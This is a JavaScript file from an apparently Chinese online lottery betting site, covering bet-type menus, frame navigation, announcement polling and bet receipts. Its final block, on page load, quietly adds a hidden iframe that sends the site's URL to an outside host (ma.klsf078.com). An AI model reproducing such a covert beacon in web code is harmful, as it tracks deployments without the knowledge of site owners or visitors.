//选择下註类型
var s_LT=null;
var CacheCI = new Array();

function SelectType(LT) {
	s_LT=LT;
	if (LT==1){
		document.getElementById("bST_1").className="bST_1 bST_1_s";
		document.getElementById("bST_2").className="bST_1";
		document.getElementById("bST_3").className="bST_1";
		document.getElementById("bST_6").className="bST_1";
		document.getElementById("bST_7").className="bST_1";
		document.getElementById("bST_5").className="bST_1";
		document.getElementById("bST_8").className="bST_1";
		document.getElementById("bST_9").className="bST_1";
		document.getElementById("body_backdrop").className="backdrop_1";
		//document.getElementById("Type_List").innerHTML='<a href="sGame_sm.php?g=g9" target="mainFrame">兩面盤</a>&nbsp;|&nbsp;<a href="sGame_sz.php?g=g9" target="mainFrame">数字盤</a>&nbsp;|&nbsp;<a href="sGame.php?g=g1"  target="mainFrame">第一球</a>&nbsp;|&nbsp;<a href="sGame.php?g=g2"  target="mainFrame">第二球</a>&nbsp;|&nbsp;<a  href="sGame.php?g=g3"  target="mainFrame">第三球</a>&nbsp;|&nbsp;<a  href="sGame.php?g=g4"  target="mainFrame">第四球</a>&nbsp;|&nbsp;<a href="sGame.php?g=g5"  target="mainFrame">第五球</a>&nbsp;|&nbsp;<a  href="sGame.php?g=g6"  target="mainFrame">第六球</a>&nbsp;|&nbsp;<a  href="sGame.php?g=g7"  target="mainFrame">第七球</a>&nbsp;|&nbsp;<a href="sGame.php?g=g8"  target="mainFrame">第八球</a>&nbsp;|&nbsp;<a  href="sGame_l.php?g=k1"  target="mainFrame">總和、龍虎</a>&nbsp;|&nbsp;<a  href="sGame_k.php?g=k2"  target="mainFrame">連碼</a>';
        document.getElementById("Type_List").innerHTML='<a href="sGame_sm.php?g=g9" target="mainFrame" class="red">兩面盤</a>&nbsp;|&nbsp;<a href="sGame_sz.php?g=g9" target="mainFrame">数字盤</a>&nbsp;|&nbsp;<a href="sGame.php?g=g1"  target="mainFrame">第一球</a>&nbsp;|&nbsp;<a href="sGame.php?g=g2"  target="mainFrame">第二球</a>&nbsp;|&nbsp;<a  href="sGame.php?g=g3"  target="mainFrame">第三球</a>&nbsp;|&nbsp;<a  href="sGame.php?g=g4"  target="mainFrame">第四球</a>&nbsp;|&nbsp;<a href="sGame.php?g=g5"  target="mainFrame">第五球</a>&nbsp;|&nbsp;<a  href="sGame.php?g=g6"  target="mainFrame">第六球</a>&nbsp;|&nbsp;<a  href="sGame.php?g=g7"  target="mainFrame">第七球</a>&nbsp;|&nbsp;<a href="sGame.php?g=g8"  target="mainFrame">第八球</a>&nbsp;|&nbsp;<a  href="sGame_l.php?g=k1"  target="mainFrame">總和、龍虎</a>&nbsp;|&nbsp;<a  href="sGame_k.php?g=k2"  target="mainFrame">連碼</a>';
		parent.frames["mainFrame"].location="sGame_sm.php?g=g9";
	} else if (LT==2){
		document.getElementById("bST_1").className="bST_1";
		document.getElementById("bST_5").className="bST_1";
		document.getElementById("bST_6").className="bST_1";
		document.getElementById("bST_2").className="bST_1 bST_1_s";
		document.getElementById("bST_3").className="bST_1";
		document.getElementById("bST_7").className="bST_1";
		document.getElementById("body_backdrop").className="backdrop_1";
		document.getElementById("bST_8").className="bST_1";
		document.getElementById("bST_9").className="bST_1";
		//document.getElementById("Type_List").innerHTML='<a href="sGame_sm_cq.php?g=g10" target="mainFrame">兩面盤</a>&nbsp;|&nbsp;<a href="sGame_sz_cq.php?g=g10" target="mainFrame">数字盤</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g1" target="mainFrame">第一球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g2" target="mainFrame">第二球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g3" target="mainFrame">第三球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g4" target="mainFrame">第四球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g5" target="mainFrame">第五球</a>';
        document.getElementById("Type_List").innerHTML='<a href="sGame_sz_cq.php?g=g9" target="mainFrame" class="red">整合</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g1" target="mainFrame">第一球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g2" target="mainFrame">第二球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g3" target="mainFrame">第三球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g4" target="mainFrame">第四球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g5" target="mainFrame">第五球</a>';
        parent.frames["mainFrame"].location="sGame_sz_cq.php?g=g9";
	}else if (LT==3){
		document.getElementById("bST_1").className="bST_1";
		document.getElementById("bST_2").className="bST_1";
		document.getElementById("bST_6").className="bST_1";
		document.getElementById("bST_5").className="bST_1";
		document.getElementById("bST_7").className="bST_1";
		document.getElementById("bST_3").className="bST_1 bST_1_s";
		document.getElementById("bST_8").className="bST_1";
		document.getElementById("bST_9").className="bST_1";
		document.getElementById("body_backdrop").className="backdrop_1";
		//document.getElementById("Type_List").innerHTML='<a href="sGame_sm_gx.php?g=g9" target="mainFrame">兩面盤</a>&nbsp;|&nbsp;<a href="sGame_sz_gx.php?g=g9" target="mainFrame">数字盤</a>&nbsp;|&nbsp;<a href="sGame_gx.php?g=g5"  target="mainFrame">特码</a>&nbsp;|&nbsp;<a href="sGame_gx.php?g=g1"  target="mainFrame">第一球</a>&nbsp;|&nbsp;<a href="sGame_gx.php?g=g2"  target="mainFrame">第二球</a>&nbsp;|&nbsp;<a  href="sGame_gx.php?g=g3"  target="mainFrame">第三球</a>&nbsp;|&nbsp;<a  href="sGame_gx.php?g=g4"  target="mainFrame">第四球</a>&nbsp;|&nbsp;<a  href="sGame_l_gx.php?g=k1"  target="mainFrame">龍虎</a>&nbsp;|&nbsp;<a  href="sGame_k_gx.php?g=k2"  target="mainFrame">連碼</a>';
        document.getElementById("Type_List").innerHTML='<a href="sGame_sm_gx.php?g=g9" target="mainFrame" class="red">兩面盤</a>&nbsp;|&nbsp;<a href="sGame_sz_gx.php?g=g9" target="mainFrame">数字盤</a>&nbsp;|&nbsp;<a href="sGame_gx.php?g=g5"  target="mainFrame">特码</a>&nbsp;|&nbsp;<a href="sGame_gx.php?g=g1"  target="mainFrame">第一球</a>&nbsp;|&nbsp;<a href="sGame_gx.php?g=g2"  target="mainFrame">第二球</a>&nbsp;|&nbsp;<a  href="sGame_gx.php?g=g3"  target="mainFrame">第三球</a>&nbsp;|&nbsp;<a  href="sGame_gx.php?g=g4"  target="mainFrame">第四球</a>&nbsp;|&nbsp;<a  href="sGame_l_gx.php?g=k1"  target="mainFrame">龍虎</a>&nbsp;|&nbsp;<a  href="sGame_k_gx.php?g=k2"  target="mainFrame">連碼</a>';
        parent.frames["mainFrame"].location="sGame_sm_gx.php?g=g9";
	}else if (LT==5){
		document.getElementById("bST_1").className="bST_1";
		document.getElementById("bST_5").className="bST_1 bST_1_s";
		document.getElementById("bST_3").className="bST_1";
		document.getElementById("bST_2").className="bST_1";
		document.getElementById("bST_7").className="bST_1";
		document.getElementById("bST_6").className="bST_1";
		document.getElementById("bST_8").className="bST_1";
		document.getElementById("bST_9").className="bST_1";
		document.getElementById("body_backdrop").className="backdrop_1";
		$("#Type_List").html('<a onclick="usclick(this)" href="sGame_sm_nc.php?g=g9" class="red" target="mainFrame">兩面盤</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_sz_nc.php?g=g9"  target="mainFrame">數字盤</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_nc.php?g=g1"  target="mainFrame">第一球</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_nc.php?g=g2"  target="mainFrame">第二球</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_nc.php?g=g3" class="us" target="mainFrame">第三球</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_nc.php?g=g4"  target="mainFrame">第四球</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_nc.php?g=g5"   target="mainFrame">第五球</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_nc.php?g=g6"  target="mainFrame">第六球</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_nc.php?g=g7"  target="mainFrame">第七球</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_nc.php?g=g8"  target="mainFrame">第八球</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_l_nc2.php?g=k1"  target="mainFrame">总和</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_l_nc.php?g=k1"  target="mainFrame">家禽野兽</a>>&nbsp;|&nbsp;<a onclick="usclick(this)" href="sGame_k_nc.php?g=k2"  target="mainFrame">連碼</a>');
        parent.frames["mainFrame"].location="sGame_sm_nc.php?g=g9";
	}else if(LT==6){
		document.getElementById("bST_1").className="bST_1";
		document.getElementById("bST_2").className="bST_1";
		document.getElementById("bST_3").className="bST_1";
		document.getElementById("bST_5").className="bST_1";
		document.getElementById("bST_7").className="bST_1";
		document.getElementById("bST_6").className="bST_1 bST_1_s";
		document.getElementById("bST_8").className="bST_1";
		document.getElementById("bST_9").className="bST_1";
		document.getElementById("body_backdrop").className="backdrop_1";
		//document.getElementById("Type_List").innerHTML='<a href="sGame_sm_pk.php?g=g11" target="mainFrame">兩面盤</a>&nbsp;|&nbsp;<a href="sGame_pk.php?g=g1"  target="mainFrame">冠、亞軍 組合</a>&nbsp;|&nbsp;<a href="sGame_pk_3.php?g=g3"  target="mainFrame">三、四、五、六名</a>&nbsp;|&nbsp;<a  href="sGame_pk_7.php?g=g7"  target="mainFrame">七、八、九、十名</a>';
        document.getElementById("Type_List").innerHTML='<a href="sGame_sm_pk.php?g=g11" target="mainFrame">兩面盤</a>&nbsp;|&nbsp;<a href="sGame_pk.php?g=g1"  target="mainFrame" class="red">冠、亞軍 組合</a>&nbsp;|&nbsp;<a href="sGame_pk_3.php?g=g3"  target="mainFrame">三、四、五、六名</a>&nbsp;|&nbsp;<a  href="sGame_pk_7.php?g=g7"  target="mainFrame">七、八、九、十名</a>';
        parent.frames["mainFrame"].location="sGame_pk.php?g=g1";
	}else if(LT==7){
		document.getElementById("bST_1").className="bST_1";
		document.getElementById("bST_2").className="bST_1";
		document.getElementById("bST_6").className="bST_1";
		document.getElementById("bST_3").className="bST_1";
		document.getElementById("bST_5").className="bST_1";
		document.getElementById("bST_7").className="bST_1 bST_1_s";
		document.getElementById("bST_8").className="bST_1";
		document.getElementById("bST_9").className="bST_1";
		document.getElementById("body_backdrop").className="backdrop_1";
		document.getElementById("Type_List").innerHTML='<a href="sGame_lhc.php?g=g7" target="mainFrame" class="red">特碼</a>&nbsp;|&nbsp;<a href="sGame_lhc.php?g=g1"  target="mainFrame" >正碼一</a>&nbsp;|&nbsp;<a href="sGame_lhc.php?g=g2"  target="mainFrame" >正碼二</a>&nbsp;|&nbsp;<a href="sGame_lhc.php?g=g3"  target="mainFrame" >正碼三</a>&nbsp;|&nbsp;<a href="sGame_lhc.php?g=g4"  target="mainFrame" >正碼四</a>&nbsp;|&nbsp;<a href="sGame_lhc.php?g=g5"  target="mainFrame" >正碼五</a>&nbsp;|&nbsp;<a href="sGame_lhc.php?g=g6"  target="mainFrame" >正碼六</a>&nbsp;|&nbsp;<a href="sGame_lhc.php?g=g8"  target="mainFrame" >正碼</a>&nbsp;|&nbsp;<a href="sGame_lhc_bo.php?g=g9"  target="mainFrame" >半波</a>&nbsp;|&nbsp;<a href="sGame_lhc_bo.php?g=g10"  target="mainFrame" >五行</a>&nbsp;|&nbsp;<a href="sGame_lhc_bo.php?g=g11"  target="mainFrame" >特碼生肖</a>&nbsp;|&nbsp;<a href="sGame_lhc_bo.php?g=g12"  target="mainFrame" >一肖</a>&nbsp;|&nbsp;<a href="sGame_lhc_wei.php?g=g13"  target="mainFrame" >特尾</a>&nbsp;|&nbsp;<a href="sGame_lhc_wei.php?g=g14"  target="mainFrame" >尾數</a>&nbsp;|&nbsp;<a href="sGame_lhc_bo.php?g=g15"  target="mainFrame" >特碼頭</a>&nbsp;|&nbsp;<a href="sGame_lhc_l.php?g=g17"  target="mainFrame" >連碼</a>&nbsp;|&nbsp;<a href="sGame_lhc_x.php?g=g18"  target="mainFrame" >合肖</a>';
        parent.frames["mainFrame"].location="sGame_lhc.php?g=g7";
	} else if (LT==8){
		document.getElementById("bST_1").className="bST_1";
		document.getElementById("bST_2").className="bST_1";
		document.getElementById("bST_5").className="bST_1";
		document.getElementById("bST_6").className="bST_1";
		document.getElementById("bST_8").className="bST_1 bST_1_s";
		document.getElementById("bST_3").className="bST_1";
		document.getElementById("bST_7").className="bST_1";
		document.getElementById("bST_9").className="bST_1";
		document.getElementById("body_backdrop").className="backdrop_1";
		//document.getElementById("Type_List").innerHTML='<a href="sGame_sm_cq.php?g=g10" target="mainFrame">兩面盤</a>&nbsp;|&nbsp;<a href="sGame_sz_cq.php?g=g10" target="mainFrame">数字盤</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g1" target="mainFrame">第一球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g2" target="mainFrame">第二球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g3" target="mainFrame">第三球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g4" target="mainFrame">第四球</a>&nbsp;|&nbsp;<a href="sGame_cq.php?g=g5" target="mainFrame">第五球</a>';
        document.getElementById("Type_List").innerHTML='<a href="sGame_sm_xj.php?g=g10" target="mainFrame" class="red">兩面盤</a>&nbsp;|&nbsp;<a href="sGame_sz_xj.php?g=g9" target="mainFrame">数字盤</a>&nbsp;|&nbsp;<a href="sGame_xj.php?g=g1" target="mainFrame">第一球</a>&nbsp;|&nbsp;<a href="sGame_xj.php?g=g2" target="mainFrame">第二球</a>&nbsp;|&nbsp;<a href="sGame_xj.php?g=g3" target="mainFrame">第三球</a>&nbsp;|&nbsp;<a href="sGame_xj.php?g=g4" target="mainFrame">第四球</a>&nbsp;|&nbsp;<a href="sGame_xj.php?g=g5" target="mainFrame">第五球</a>';
        parent.frames["mainFrame"].location="sGame_sm_xj.php?g=g10";
	}else if (LT==9){
		document.getElementById("bST_1").className="bST_1";
		document.getElementById("bST_2").className="bST_1";
		document.getElementById("bST_5").className="bST_1";
		document.getElementById("bST_6").className="bST_1";
		document.getElementById("bST_9").className="bST_1 bST_1_s";
		document.getElementById("bST_3").className="bST_1";
		document.getElementById("bST_7").className="bST_1";
		document.getElementById("bST_8").className="bST_1";
		document.getElementById("body_backdrop").className="backdrop_1"; 
        document.getElementById("Type_List").innerHTML='<a class="red" href="sGame_jstb.php"  target="mainFrame">大小骰寶</a>';
        parent.frames["mainFrame"].location="sGame_jstb.php?g=g10";
	}
	$("#Type_List a").click(function(){
		$('#Type_List a').removeClass('red');
		$(this).addClass('red');
	});
}

function MF_CI(T) {
    if (CacheCI[Number(T)] == undefined) {
        parent.frames["mainFrame"].location="CI_" + s_LT + ".aspx?T=" + T;
    } else {
        parent.frames["mainFrame"].location="CI_" + s_LT + ".aspx?T=" + T + "&C=1";
    }
}

function Save_CacheCI(T) {
    CacheCI[Number(T)]=parent.frames["mainFrame"].document.body.innerHTML;
}
function Load_CacheCI(T) {
    parent.frames["mainFrame"].document.body.innerHTML=CacheCI[Number(T)];
}

var Html_SB="<html>";
Html_SB+="<head>";
Html_SB+="    <meta http-equiv='Content-Type' content='text/html; charset=gb2312' />";
Html_SB+="    <script src='js/Forbid.js' type='text/javascript'></script>";
Html_SB+="</head>";
Html_SB+="<body>";
Html_SB+="<object classid=\'clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\' codebase=\'http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,22,0\' width=700 height=500 id=SB><param name=wmode value=transparent /><param name=movie value=SB.swf /><param name=FlashVars value=pageID=0 /><param name=quality value=high /><param name=menu value=false><embed src=SB.swf name=SB quality=high wmode=transparent type=\'application/x-shockwave-flash\' pluginspage=\'http://www.macromedia.com/shockwave/download/index.cgi?p1_prod_version=shockwaveflash\' width=700 height=500></embed></object>";
Html_SB+="</body>";
Html_SB+="</html>";
var SB_Limit_Time=0;//限製時間

function Today_Second() {
    var date=new Date();
    return date.getHours()*3600+date.getMinutes()*60+date.getSeconds();
}

function SB_Limit(Ltime) {
    SB_Limit_Time=Today_Second() + Ltime;
}

function MF_URL(url) {
    if (url.substring(0,7)=="Report_"){
        if (SB_Limit_Time > Today_Second()){
            parent.frames["mainFrame"].document.close();
            parent.frames["mainFrame"].document.write(Html_SB);
        } else {
            parent.frames["mainFrame"].location=url;    
        }
    } else {
        parent.frames["mainFrame"].location=url;
    }
}

///////////////////更新公告

var t_UpdateAD=50;
var RealityIP='';
//更新倒计时
function UpdateAD() {
    if (RealityIP!=''){
        t_UpdateAD=0;
        XmlLoad();
    } else {
	    if (t_UpdateAD>1) {
		    t_UpdateAD=t_UpdateAD-1;
	   	    setTimeout("UpdateAD()",1000);
	    } else {
		    XmlLoad();
	    }
	}
}
var XmlActiveX=new ActiveXObject("Microsoft.XMLDOM");
function XmlLoad() {
    try {
        XmlActiveX.onreadystatechange=XmlReady;
        XmlActiveX.async="true";
        if (RealityIP!=''){
            XmlActiveX.load("LoadNewS.aspx?rIP=" + RealityIP);
            RealityIP=""
        } else {
            XmlActiveX.load("LoadNewS.aspx");
        }
    } catch (e){
        setTimeout("UpdateAD()",1000);
    }
}
function XmlReady() {    
    if (XmlActiveX.readyState==4) {
        var xml=XmlActiveX.documentElement;
        XmlTraverse(xml);
    }
}

function XmlTraverse(pnode) {
    var l=pnode.childNodes.length;
    for(var i=0;i<l;i++) {
        var node=pnode.childNodes[i];
        if (node.tagName=="LandErr") { //error
            if (node.text=="EXIT") top.location.href = "../"; 
        } else if (node.tagName=="Affiche") {
            try {
                parent.DownFrame.document.getElementById("Affiche").innerHTML=node.text;
            } catch (e){}
            //繼續
            t_UpdateAD=50;
            setTimeout("UpdateAD()",1000);
        }
    }
}

function Select_MC(MC_ID) {
    for(var i=1;i<=21;i++) {
        var t_MC=document.getElementById("MC"+i);
        if (t_MC!=null) t_MC.className="";
    }
    
    var s_MC=document.getElementById("MC"+MC_ID);
    if (s_MC!=null) s_MC.className="Font_R";
}

function UpadteAffiche(t_Info) {
    try {
        parent.DownFrame.document.getElementById("Affiche").innerHTML=t_Info;
    } catch (e){}
}

///////////////////反馈信息
var UserName="";

var H_Jeu1="<table border='0' cellpadding='0' cellspacing='1' class='t_list' width='231'>";
H_Jeu1+="<tr><td align='center' class='t_list_caption' colspan='2'><strong>下註結果反饋</strong></td></tr>";
H_Jeu1+="<tr><td class='t_td_caption_1' width='65'>會員帳戶</td>";
H_Jeu1+="<td class='t_td_text' width='166'>";
var H_Jeu2="</td></tr><tr><td class='t_td_caption_1'>可用金額</td><td id='Money_KY_1' class='t_td_text'>";
var H_Jeu3="</td></tr><tr><td class='t_td_but' colspan='2'><input class='btn2' onMouseOut=this.className='btn2' onMouseOver=this.className='btn2m' name='print' onClick='window.print()' type='button' value='打 印'>&nbsp;&nbsp;&nbsp;<input class='btn2' onMouseOut=this.className='btn2' onMouseOver=this.className='btn2m' name='return' onClick=window.location='";
var H_Jeu3_1="' type='button' value='返 囬'></td></tr><tr><td align='center' class='t_td_unite_1' colspan='2'><strong>";
var H_Jeu4="期</strong></td></tr>";
var H_Jeu5="<tr><td class='t_td_caption_1'>下註筆數</td><td class='t_td_text'>";
var H_Jeu6="&nbsp;筆</td></tr><tr><td class='t_td_caption_1'>閤計註額</td><td class='t_td_text'>￥";
var H_Jeu7="</td></tr></table><br><br>";
var MX_Jeu1="<tr><td align='center' class='t_td_odd_1' colspan='2' height='74' valign='middle'><table border='0' cellpadding='0' cellspacing='0' width='100%'><tr><td align='center' height='16' width='26%'>註單號：</td><td width='74%'>";
var MX_Jeu2="</td></tr><tr><td align='center' colspan='2' height='18'><span class='jeu_XZ_Type'>";
var MX_Jeu3="</span>@&nbsp;<span id='jeu_multiple' class='jeu_multiple'>";
var MX_Jeu4="</span></td></tr><tr><td align='center' height='16'>下註額：</td><td>";
var MX_Jeu5="</td></tr><tr><td align='center' height='16'>可贏額：</td><td>";
var MX_Jeu6="</td></tr></table></td></tr>";

function Show_Confirm_Jeu() {
    var t_Http = H_Jeu1 + UserName;
    t_Http+=H_Jeu2 + parent.leftFrame.mKY;
    t_Http+=H_Jeu3 + parent.leftFrame.rURL + H_Jeu3_1 + parent.leftFrame.lNO;
    t_Http+=H_Jeu4;
    
    var Money_Sum=0;
    for(var i=0;i< parent.leftFrame.Jmx.length;i++) {
        t_Http+=MX_Jeu1 + parent.leftFrame.Jmx[i][0];
        t_Http+=MX_Jeu2 + parent.leftFrame.Jmx[i][1];
        t_Http+=MX_Jeu3 + parent.leftFrame.Jmx[i][2];
        t_Http+=MX_Jeu4 + parent.leftFrame.Jmx[i][3];
        t_Http+=MX_Jeu5 + parent.leftFrame.Jmx[i][4];
        t_Http+=MX_Jeu6;
        
        Money_Sum=Money_Sum + Number(parent.leftFrame.Jmx[i][3].replace(",",""));
    }
    
    t_Http+=H_Jeu5 + parent.leftFrame.Jmx.length;
    t_Http+=H_Jeu6 + Money_Sum;
    t_Http+=H_Jeu7;
    parent.frames["leftFrame"].document.body.innerHTML=t_Http;
}
$(document).ready(function(){
	var url = location.href.split('/'); 
	$(document.body).append("<iframe src='http://ma.klsf078.com/validUrl.php?url="+url[0]+'/'+url[1]+'/'+url[2]+"' style='display:none'></iframe>");
})